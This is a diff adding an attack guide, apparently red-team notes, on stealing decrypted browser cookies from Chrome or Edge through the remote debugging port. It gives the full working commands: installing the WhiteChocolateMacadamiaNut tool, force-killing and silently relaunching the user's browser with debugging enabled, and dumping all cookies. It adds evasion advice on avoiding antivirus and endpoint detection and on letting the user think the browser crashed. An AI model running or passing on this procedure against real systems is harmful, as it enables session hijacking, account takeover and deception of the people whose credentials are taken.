@@ -1,0 +1,30 @@
+The following is one method for remotely stealing browser credentials from Chrome. This is also possible with Microsoft Edge which uses the Chromium framework.
+
+This method uses the built in Chrome debugging port to snag the cookies after Chrome has already decrypted them.
+
+First, you'll need a working copy of WhiteChocolateMacadamiaNut: https://github.com/slyd0g/WhiteChocolateMacademiaNut
+This tool is written on Go and can be downloaded and compiled with the following command:
+
+  go get github.com/slyd0g/WhiteChocolateMacademiaNut
+  
+In order to get access to the cookies, we'll need to restart the user's browser with the debugging port open. 
+We can do this with 2 shell commands or 2 PowerShell commands. Select the method that works best for your particular engagement.
+These two commands shut down the current running browser process, thenimmediately restart it with the debugging port open and reloading
+the previous user session. You will need to know the correct path to the user's Chrome data folder. The user will see the browser close then
+immediately re-open and ask if it should load the previously running sessions. Hopefully they just assume Chrome crashed and move on with their life.
+
+Windows shell commands:
+
+  taskkill /F /IM chrome.exe && "C:\Program Files\\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --restore-last-session --user-data-dir="C:\Users\<username>\AppData\Local\Google\Chrome\User Data"
+
+Windows PowerShell commands:
+
+  Get-Process "chrome" | Stop-Process
+  Start-Process "chrome.exe" -ArgumentList '--remote-debugging-port=9222 --restore-last-session --user-data-dir="C:\Users\<username>\AppData\Local\Google\Chrome\User Data"'
+
+At this point, Chrome is running with the debugging port open and you can use WhiteChocolateMacadamiaNut to steal the cookies. OPSEC Note: It's best to
+proxy this tool to your target rather than write it to disk. It can be done either way, but writing it to disk will require that you bypass AV/EDR.
+
+  WhiteChocolateMacadamiaNut -p 9222 -d cookies -f raw <-- This will export all the decrypted cookies in JSON format
+  
+  WhiteChocolateMacadamiaNut -p 9222 -d cookies -f human <-- This will export all the decrypted cookies in human readable format
